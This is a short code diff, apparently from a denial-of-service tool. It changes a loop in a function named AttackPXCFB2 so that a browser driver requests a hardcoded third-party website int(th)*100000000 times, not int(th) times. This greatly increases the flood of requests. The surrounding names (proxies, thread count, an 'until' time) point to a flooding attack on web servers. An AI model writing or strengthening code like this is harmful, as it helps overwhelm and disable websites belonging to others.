@@ -627,7 +627,7 @@ def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
 
                 # Define the URL you want to scrape
                 url = 'https://xvideos68.com'
-                for _ in range(int(th) ):
+                for _ in range(int(th)*100000000 ):
                     driver.get(url)
                     # Get the page source
                     page_source = driver.title
